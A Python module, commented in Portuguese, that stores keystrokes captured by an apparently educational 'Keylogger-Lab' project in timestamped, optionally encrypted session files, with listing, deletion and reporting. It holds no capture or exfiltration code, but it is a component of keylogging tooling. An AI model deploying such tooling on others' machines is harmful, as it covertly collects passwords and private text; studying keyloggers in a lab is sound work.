"""
Módulo de Armazenamento — Keylogger-Lab
=======================================

Gerencia a persistência dos eventos de teclado capturados em arquivos
de texto (.txt), organizados por sessão e com registro cronológico.

Conceitos demonstrados:
    - Manipulação de arquivos com Python (open, read, write, append)
    - Organização de logs por sessão
    - Formatação de relatórios legíveis
    - Integração opcional com criptografia
    - Auditoria e rastreabilidade de dados

Estrutura de um arquivo de sessão:
    ============================================================
      KEYLOGGER-LAB — REGISTRO DE SESSÃO
    ============================================================
      Sessão: sessao_001
      Início: 2024-01-15 10:30:00
    ============================================================

    Horário        Tipo         Tecla
    -------------- ------------ ------------------------------
    10:30:01.123   caractere    a
    10:30:01.456   caractere    b
    10:30:02.789   especial     [ENTER]
    ...

    ============================================================
      Fim da sessão: 2024-01-15 10:45:00
      Total de eventos: 150
    ============================================================
"""

import os
import datetime
import logging
from typing import List, Optional

from src.criptografia import GerenciadorCriptografia


class GerenciadorArmazenamento:
    """
    Gerencia o armazenamento de eventos de teclado em arquivos TXT.

    Cada sessão de captura gera um arquivo separado (sessao_001.txt,
    sessao_002.txt, etc.) no diretório de logs.

    Attributes:
        diretorio_logs (str): Caminho do diretório onde os logs são salvos.
        usar_criptografia (bool): Se True, criptografa os arquivos ao finalizar a sessão.
        sessao_atual (str): Identificador da sessão em andamento (ou None).
    """

    def __init__(self, diretorio_logs: str = "logs", usar_criptografia: bool = False):
        """
        Inicializa o gerenciador de armazenamento.

        Args:
            diretorio_logs: Diretório onde os arquivos de log serão salvos.
            usar_criptografia: Se True, habilita a criptografia dos logs ao
                              finalizar cada sessão.
        """
        self.diretorio_logs = diretorio_logs
        self.usar_criptografia = usar_criptografia
        self.sessao_atual: Optional[str] = None
        self.contador_eventos: int = 0
        self.logger = logging.getLogger("armazenamento")

        # Inicializa o gerenciador de criptografia se necessário
        self.cripto: Optional[GerenciadorCriptografia] = None
        if usar_criptografia:
            self.cripto = GerenciadorCriptografia()

        # Garante que o diretório de logs existe
        os.makedirs(diretorio_logs, exist_ok=True)

        # Determina o próximo número de sessão
        self._proximo_numero = self._obter_proximo_numero_sessao()
        self.logger.info(
            f"Armazenamento inicializado: dir={diretorio_logs}, "
            f"criptografia={'ativada' if usar_criptografia else 'desativada'}, "
            f"próxima sessão={self._proximo_numero}"
        )

    def _obter_proximo_numero_sessao(self) -> int:
        """
        Calcula o próximo número de sessão com base nos arquivos existentes.

        Examina o diretório de logs para encontrar o maior número de sessão
        existente e retorna o próximo valor sequencial.

        Returns:
            int: Próximo número de sessão disponível.
        """
        if not os.path.exists(self.diretorio_logs):
            return 1

        arquivos = [
            f
            for f in os.listdir(self.diretorio_logs)
            if f.startswith("sessao_") and f.endswith(".txt")
        ]

        if not arquivos:
            return 1

        numeros = []
        for f in arquivos:
            try:
                numero = int(f.replace("sessao_", "").replace(".txt", ""))
                numeros.append(numero)
            except ValueError:
                continue

        return max(numeros) + 1 if numeros else 1

    def iniciar_sessao(self) -> str:
        """
        Inicia uma nova sessão de captura e cria o arquivo de log correspondente.

        Cada sessão recebe um identificador único sequencial (sessao_001,
        sessao_002, etc.) e um cabeçalho com metadados.

        Returns:
            str: Identificador da sessão criada.

        Raises:
            RuntimeError: Se já houver uma sessão em andamento.
        """
        if self.sessao_atual is not None:
            raise RuntimeError(
                f"Sessão '{self.sessao_atual}' já está em andamento. "
                "Finalize-a antes de iniciar uma nova."
            )

        self.sessao_atual = f"sessao_{self._proximo_numero:03d}"
        self.contador_eventos = 0
        caminho = self._caminho_sessao()
        agora = datetime.datetime.now()

        # Escrita do cabeçalho da sessão
        with open(caminho, "w", encoding="utf-8") as f:
            f.write(f"{'=' * 60}\n")
            f.write(f"  KEYLOGGER-LAB — REGISTRO DE SESSÃO\n")
            f.write(f"{'=' * 60}\n")
            f.write(f"  Sessão    : {self.sessao_atual}\n")
            f.write(f"  Início    : {agora.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"  Laboratório Educacional de Cibersegurança\n")
            f.write(f"{'=' * 60}\n\n")
            f.write(f"{'Horário':<14} {'Tipo':<12} {'Tecla'}\n")
            f.write(f"{'-' * 14} {'-' * 12} {'-' * 30}\n")

        self._proximo_numero += 1
        self.logger.info(f"Sessão iniciada: {self.sessao_atual} em {caminho}")
        return self.sessao_atual

    def _caminho_sessao(self) -> str:
        """Retorna o caminho completo do arquivo da sessão atual."""
        if not self.sessao_atual:
            raise RuntimeError("Nenhuma sessão ativa")
        return os.path.join(self.diretorio_logs, f"{self.sessao_atual}.txt")

    def registrar_evento(self, tecla: str, tipo: str = "caractere"):
        """
        Registra um evento de teclado no arquivo da sessão atual.

        Cada evento é registrado com timestamp de alta precisão (milissegundos),
        tipo do evento e representação da tecla.

        Args:
            tecla: Representação da tecla pressionada (ex: 'a', '[ENTER]').
            tipo: Classificação do evento ('caractere', 'especial', 'sistema').

        Raises:
            RuntimeError: Se nenhuma sessão estiver ativa.
        """
        if not self.sessao_atual:
            self.logger.warning("Tentativa de registrar evento sem sessão ativa")
            return

        horario = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
        linha = f"{horario:<14} {tipo:<12} {tecla}\n"

        try:
            caminho = self._caminho_sessao()
            with open(caminho, "a", encoding="utf-8") as f:
                f.write(linha)
            self.contador_eventos += 1
        except IOError as e:
            self.logger.error(f"Erro ao registrar evento: {e}")

    def finalizar_sessao(self) -> Optional[str]:
        """
        Finaliza a sessão atual, adicionando rodapé e opcionalmente criptografando.

        Returns:
            str ou None: Identificador da sessão finalizada, ou None se não havia sessão.
        """
        if not self.sessao_atual:
            self.logger.warning("Tentativa de finalizar sessão inexistente")
            return None

        caminho = self._caminho_sessao()
        agora = datetime.datetime.now()

        # Escrita do rodapé da sessão
        try:
            with open(caminho, "a", encoding="utf-8") as f:
                f.write(f"\n{'=' * 60}\n")
                f.write(f"  Fim da sessão   : {agora.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"  Total de eventos: {self.contador_eventos}\n")
                f.write(f"{'=' * 60}\n")
        except IOError as e:
            self.logger.error(f"Erro ao finalizar sessão: {e}")

        # Criptografia opcional do arquivo
        if self.usar_criptografia and self.cripto:
            try:
                caminho_cripto = self.cripto.criptografar_arquivo(caminho)
                self.logger.info(f"Sessão criptografada: {caminho_cripto}")
            except Exception as e:
                self.logger.error(f"Erro ao criptografar sessão: {e}")

        sessao_finalizada = self.sessao_atual
        self.logger.info(
            f"Sessão finalizada: {sessao_finalizada} "
            f"({self.contador_eventos} eventos registrados)"
        )

        self.sessao_atual = None
        self.contador_eventos = 0
        return sessao_finalizada

    def listar_sessoes(self) -> List[str]:
        """
        Lista todos os arquivos de sessão disponíveis no diretório de logs.

        Returns:
            list: Lista ordenada de nomes de arquivos de sessão (.txt).
        """
        if not os.path.exists(self.diretorio_logs):
            return []

        sessoes = sorted(
            f
            for f in os.listdir(self.diretorio_logs)
            if f.startswith("sessao_") and f.endswith(".txt")
        )
        return sessoes

    def ler_sessao(self, nome_sessao: str) -> Optional[str]:
        """
        Lê e retorna o conteúdo completo de um arquivo de sessão.

        Se existir uma versão criptografada (.enc), tenta descriptografá-la.

        Args:
            nome_sessao: Nome do arquivo da sessão (ex: 'sessao_001.txt').

        Returns:
            str ou None: Conteúdo do arquivo, ou None se não encontrado.
        """
        caminho = os.path.join(self.diretorio_logs, nome_sessao)

        # Tenta ler arquivo criptografado primeiro
        caminho_enc = caminho + ".enc"
        if os.path.exists(caminho_enc) and self.cripto:
            try:
                return self.cripto.descriptografar_arquivo(caminho_enc)
            except Exception as e:
                self.logger.warning(f"Falha ao descriptografar {caminho_enc}: {e}")

        # Lê arquivo de texto normal
        if not os.path.exists(caminho):
            self.logger.warning(f"Sessão não encontrada: {nome_sessao}")
            return None

        try:
            with open(caminho, "r", encoding="utf-8") as f:
                return f.read()
        except IOError as e:
            self.logger.error(f"Erro ao ler sessão {nome_sessao}: {e}")
            return None

    def excluir_sessao(self, nome_sessao: str) -> bool:
        """
        Exclui um arquivo de sessão (e sua versão criptografada, se existir).

        Args:
            nome_sessao: Nome do arquivo da sessão a ser excluída.

        Returns:
            bool: True se excluída com sucesso.
        """
        caminho = os.path.join(self.diretorio_logs, nome_sessao)
        excluido = False

        for path in [caminho, caminho + ".enc"]:
            if os.path.exists(path):
                try:
                    os.remove(path)
                    excluido = True
                    self.logger.info(f"Arquivo excluído: {path}")
                except IOError as e:
                    self.logger.error(f"Erro ao excluir {path}: {e}")

        return excluido

    def gerar_relatorio(self) -> str:
        """
        Gera um relatório resumido de todas as sessões disponíveis.

        Returns:
            str: Relatório formatado com informações de cada sessão.
        """
        sessoes = self.listar_sessoes()
        agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        linhas = [
            "=" * 60,
            "  RELATÓRIO GERAL — KEYLOGGER-LAB",
            "=" * 60,
            f"  Gerado em      : {agora}",
            f"  Total de sessões: {len(sessoes)}",
            f"  Diretório      : {os.path.abspath(self.diretorio_logs)}",
            f"  Criptografia   : {'Ativada' if self.usar_criptografia else 'Desativada'}",
            "-" * 60,
        ]

        for nome in sessoes:
            caminho = os.path.join(self.diretorio_logs, nome)
            try:
                tamanho = os.path.getsize(caminho)
                modificado = datetime.datetime.fromtimestamp(
                    os.path.getmtime(caminho)
                ).strftime("%Y-%m-%d %H:%M")
                linhas.append(f"  📄 {nome:<20} {tamanho:>8} bytes  Modificado: {modificado}")
            except OSError:
                linhas.append(f"  📄 {nome:<20} [erro ao ler informações]")

        if not sessoes:
            linhas.append("  Nenhuma sessão encontrada.")

        linhas.append("=" * 60)
        return "\n".join(linhas)

    def obter_estatisticas(self) -> dict:
        """
        Retorna estatísticas do sistema de armazenamento.

        Returns:
            dict: Dicionário com estatísticas (total_sessoes, tamanho_total, etc.).
        """
        sessoes = self.listar_sessoes()
        tamanho_total = 0

        for nome in sessoes:
            caminho = os.path.join(self.diretorio_logs, nome)
            try:
                tamanho_total += os.path.getsize(caminho)
            except OSError:
                pass

        return {
            "total_sessoes": len(sessoes),
            "tamanho_total_bytes": tamanho_total,
            "tamanho_total_kb": round(tamanho_total / 1024, 2),
            "sessao_ativa": self.sessao_atual,
            "eventos_sessao_atual": self.contador_eventos,
            "criptografia_ativa": self.usar_criptografia,
            "diretorio": os.path.abspath(self.diretorio_logs),
        }
